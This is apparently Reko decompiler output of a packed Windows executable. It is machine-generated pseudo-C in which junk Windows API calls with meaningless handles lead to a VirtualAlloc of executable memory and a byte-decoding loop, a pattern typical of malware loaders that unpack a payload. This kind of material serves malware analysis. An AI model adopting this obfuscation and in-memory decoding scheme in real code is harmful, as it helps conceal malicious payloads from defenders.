// subject_UPX0_0000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401ABB: Register ui32 fn00401ABB(Register ui32 edx)
// Called from:
//      fn00401AF2
ui32 fn00401ABB(ui32 edx)
{
	return ~edx;
}

// 00401AF2: Register ptr32 fn00401AF2(Register ui32 edx, Register ui32 esi, Register out ptr32 ecxOut, Register out ptr32 edxOut, Register out Eq_9 esiOut)
// Called from:
//      fn00401B1B
ptr32 fn00401AF2(ui32 edx, ui32 esi, ptr32 & ecxOut, ptr32 & edxOut, union Eq_9 & esiOut)
{
	ptr32 fp;
	ptr32 edx_23 = fn00401ABB(edx);
	ecxOut = fp - 0x01B5;
	edxOut = edx_23;
	esiOut = esi | 0x50;
	return fp - 0x01CC;
}

// 00401B1B: Register word32 fn00401B1B(Register ui32 edx, Register word32 ebx, Register word32 esi, Register out ptr32 ecxOut, Register out ptr32 edxOut, Register out ptr32 ebxOut, Register out ptr32 esiOut)
// Called from:
//      fn00401D38
word32 fn00401B1B(ui32 edx, word32 ebx, word32 esi, ptr32 & ecxOut, ptr32 & edxOut, ptr32 & ebxOut, ptr32 & esiOut)
{
	up32 dwLoc2C;
	ptr32 ecx_33;
	ptr32 edx_34;
	ptr32 esi_35;
	word32 eax_32 = fn00401AF2(edx & 5396590, esi - 0x55, out ecx_33, out edx_34, out esi_35);
	ecxOut = ecx_33;
	edxOut = edx_34;
	ebxOut = ebx + edx + (word32) (dwLoc2C < 0x00);
	esiOut = esi_35;
	return eax_32;
}

// 00401B4E: Register ptr32 fn00401B4E(Register ptr32 edx, Register ui32 edi, Register out Eq_51 ediOut)
// Called from:
//      fn00401B89
ptr32 fn00401B4E(ptr32 edx, ui32 edi, union Eq_51 & ediOut)
{
	ediOut = edi | 0x61;
	return edx - 0x01;
}

// 00401B89: Register ptr32 fn00401B89(Register ptr32 edx, Register ui32 edi, Register out ptr32 edxOut, Register out ptr32 ediOut)
// Called from:
//      fn00401D38
ptr32 fn00401B89(ptr32 edx, ui32 edi, ptr32 & edxOut, ptr32 & ediOut)
{
	ptr32 fp;
	ptr32 edi_23;
	edxOut = fn00401B4E(edx, edi, out edi_23);
	ediOut = edi_23;
	return fp - 100;
}

// 00401BBD: void fn00401BBD()
// Called from:
//      fn00401C50
void fn00401BBD()
{
}

// 00401C23: FlagGroup bool fn00401C23(Register Eq_70 eax, Register Eq_71 edx, Register out Eq_72 eaxOut)
// Called from:
//      fn00401C32
bool fn00401C23(Eq_70 eax, Eq_71 edx, union Eq_72 & eaxOut)
{
	eaxOut = eax & edx;
	return false;
}

// 00401C32: FlagGroup bool fn00401C32(Register Eq_70 eax, Register ptr32 ecx, Register Eq_71 edx, Register word32 ebx, Register out ptr32 eaxOut, Register out ptr32 ecxOut, Register out Eq_82 ebxOut)
// Called from:
//      fn00401C50
bool fn00401C32(Eq_70 eax, ptr32 ecx, Eq_71 edx, word32 ebx, ptr32 & eaxOut, ptr32 & ecxOut, union Eq_82 & ebxOut)
{
	ptr32 eax_24;
	bool C_26 = fn00401C23(eax, edx, out eax_24);
	eaxOut = eax_24;
	ecxOut = ecx - 0x01;
	ebxOut = ebx ^ ecx;
	return C_26;
}

// 00401C50: Register Eq_70 fn00401C50(Register Eq_70 eax, Register ptr32 ecx, Register Eq_71 edx, Register word32 ebx, Register out ptr32 ebxOut)
// Called from:
//      fn00401D38
Eq_70 fn00401C50(Eq_70 eax, ptr32 ecx, Eq_71 edx, word32 ebx, ptr32 & ebxOut)
{
	Eq_70 eax_20;
	word32 ebx_21;
	word32 ecx_22;
	ptr32 ebx_28 = ebx_21 - ecx_22 - (word32) fn00401C32(eax, ecx, edx, ebx, out eax_20, out ecx_22, out ebx_21);
	fn00401BBD();
	ebxOut = ebx_28;
	return eax_20;
}

// 00401D38: void fn00401D38(Register word32 ebx, Register (ptr32 Eq_114) ebp, Register word32 esi, Register ui32 edi)
void fn00401D38(word32 ebx, struct Eq_114 * ebp, word32 esi, ui32 edi)
{
	Eq_117 fp;
	Eq_118 dwLoc01FC;
	int32 dwLoc015C;
	Eq_120 dwLocE4;
	Eq_120 dwLoc01F4;
	BOOL eax_16 = ShowWindow((struct HWND__ *) 0xF1350A1C, fp - 0xD0);
	word32 * esp_17 = (word32) fp - 372;
	if (eax_16 == 0x00)
	{
		word32 ebx_37;
		fn00401C50(fp - 0xAC, fp - 344, fp - 0x01B4, ebx, out ebx_37);
		ui32 edx_53;
		word32 edi_233;
		fn00401B89(fp - 0x01B4, edi, out edx_53, out edi_233);
		word32 ebx_68;
		ui32 ecx_69;
		Eq_125 edx_71;
		ui32 esi_72;
		int32 eax_67 = fn00401B1B(edx_53, ebx_37, esi, out ecx_69, out edx_71, out ebx_68, out esi_72);
		CreateWindowExW(dwLoc01F4, null, null, dwLocE4, eax_67, eax_67, eax_67, dwLoc015C, edx_71, (struct HMENU__ *) 12610, (struct HINSTANCE__ *) 4062624692, dwLoc01FC);
		SelectObject((struct HDC__ *) 3536055139, (void *) 4175336183);
		ShowWindow(null, fp - 84);
		SetEvent((void *) 4029245541);
		GetDlgItem((struct HWND__ *) 0xF2F8CC03, esi_72 | 0x54376477);
		CreateCompatibleBitmap((struct HDC__ *) ~0x035AF144, fp - 220, fp - 84);
		GetCommandLineA();
		int32 esi_151 = SLICE(SEQ(esi_72 | 0x54376477, fp - 84) + SEQ(ecx_69 - eax_67, 77), word32, 32);
		fn0040670A(ebx_68, ebp, esi_151, 0x43);
		struct Eq_255 * esp_160 = (struct Eq_255 *) <invalid>;
		word32 esi_165 = esp_160->dw0000;
		esp_160->dw0000 = esi_165;
		esp_160->dwFFFFFFFC = esi_165;
	}
	else
	{
		*eax_16 = eax_16;
		while (eax_16 != 0x00)
		{
			esp_17 -= 4;
			*esp_17 = (word32) eax_16;
		}
	}
}

// 004062D0: Register ptr32 fn004062D0(Register ptr32 ecx)
// Called from:
//      fn00406F9F
ptr32 fn004062D0(ptr32 ecx)
{
	return ~ecx;
}

// 0040635B: void fn0040635B()
// Called from:
//      fn004067A2
void fn0040635B()
{
}

// 004063B4: Register Eq_269 fn004063B4(Register up32 eax, Register Eq_269 ebx, Register int32 esi, Register out ptr32 esiOut)
// Called from:
//      fn0040670A
Eq_269 fn004063B4(up32 eax, Eq_269 ebx, int32 esi, ptr32 & esiOut)
{
	up32 dwLoc3C;
	up32 dwLoc48;
	fn00406B9B();
	esiOut = esi + 0x01;
	return ebx - 113 - (word32) ((dwLoc48 + eax) + (word32) (dwLoc3C < 0x00) < 0x00);
}

// 00406491: void fn00406491()
// Called from:
//      fn0040670A
void fn00406491()
{
}

// 00406693: void fn00406693()
// Called from:
//      fn0040670A
void fn00406693()
{
}

// 0040670A: void fn0040670A(Register word32 ebx, Register (ptr32 Eq_114) ebp, Register int32 esi, Register word32 edi)
// Called from:
//      fn00401D38
void fn0040670A(word32 ebx, struct Eq_114 * ebp, int32 esi, word32 edi)
{
	Eq_120 v5_6 = ebp->tFFFFFEA0;
	GetModuleFileNameA((struct HINSTANCE__ *) 3366050869, ebp - 484, v5_6);
	ShowWindow(null, esi);
	fn00406DB0();
	fn00406CBC();
	GetCurrentProcessId();
	Eq_269 ebx_43 = fn00406EF3(ebx, esi);
	GetStockObject(0x0A);
	GetCommandLineA();
	fn00406C31();
	SendMessageW((struct HWND__ *) ~0x6A172822, ebp - 0x01C8, 0x3733, ebx_43);
	SleepEx(0x01, 0x00);
	if ((word32) ebp->wFFFFFE38 != 2242)
		return;
	CreateCompatibleBitmap((struct HDC__ *) 2667035701, ebp->dwFFFFFE64, ebp - 336);
	ShowWindow(null, ebp - 0x017C);
	Eq_232 eax_96 = GetCommandLineA();
	word32 ecx_323;
	up32 eax_107 = fn00406B55(eax_96, ebp - 0x017C, ebp, out ecx_323);
	fn00406C6C();
	fn00406491();
	word32 esi_324;
	fn004063B4(eax_107, ebx_43, esi, out esi_324);
	word32 edi_325;
	fn00406F5D(edi, out edi_325);
	fn00406693();
	Eq_118 eax_180 = VirtualAlloc(0x00, 87674, 0x1000, 0x40);
	byte * esi_199 = ebp - 336;
	Eq_118 eax_211 = eax_180;
	word32 edi_217;
	for (edi_217 = 0x3D38; edi_217 != 0x00; --edi_217)
	{
		*eax_211.u0 += __ror<byte,byte>(*esi_199, 0x0C) + 0x1B;
		++esi_199;
		eax_211.u0 = (word32) eax_211 + 1;
	}
}

// 004067A2: void fn004067A2()
// Called from:
//      fn00406C27
void fn004067A2()
{
	fn0040635B();
}

// 00406B55: Register Eq_232 fn00406B55(Register Eq_232 eax, Register Eq_389 ecx, Register (ptr32 Eq_114) ebp, Register out Eq_391 ecxOut)
// Called from:
//      fn0040670A
Eq_232 fn00406B55(Eq_232 eax, Eq_389 ecx, struct Eq_114 * ebp, union Eq_391 & ecxOut)
{
	Eq_462 tLoc04;
	tLoc04 = (Eq_462) ebp;
	Eq_232 eax_11 = -eax;
	fn00406C27();
	ecxOut = ecx | 0x32;
	return eax_11;
}

// 00406B9B: void fn00406B9B()
// Called from:
//      fn004063B4
void fn00406B9B()
{
}

// 00406C27: void fn00406C27()
// Called from:
//      fn00406B55
void fn00406C27()
{
	fn004067A2();
}

// 00406C31: void fn00406C31()
// Called from:
//      fn0040670A
void fn00406C31()
{
}

// 00406C6C: void fn00406C6C()
// Called from:
//      fn0040670A
void fn00406C6C()
{
}

// 00406CBC: void fn00406CBC()
// Called from:
//      fn0040670A
void fn00406CBC()
{
}

// 00406DB0: void fn00406DB0()
// Called from:
//      fn0040670A
void fn00406DB0()
{
}

// 00406EF3: Register word32 fn00406EF3(Register word32 ebx, Register int32 esi)
// Called from:
//      fn0040670A
word32 fn00406EF3(word32 ebx, int32 esi)
{
	word32 ebx_12 = ebx - esi;
	fn00406F9F();
	return ebx_12;
}

// 00406F5D: Register ptr32 fn00406F5D(Register word32 edi, Register out Eq_410 ediOut)
// Called from:
//      fn0040670A
ptr32 fn00406F5D(word32 edi, union Eq_410 & ediOut)
{
	ptr32 fp;
	fn00406FF0();
	ediOut = edi ^ 0x77513172;
	return fp - 16;
}

// 00406F9F: Register word32 fn00406F9F()
// Called from:
//      fn00406EF3
word32 fn00406F9F()
{
	ptr32 fp;
	word32 ecx_14 = fn004062D0(fp - 0x94);
	return ecx_14;
}

// 00406FF0: void fn00406FF0()
// Called from:
//      fn00406F5D
void fn00406FF0()
{
}

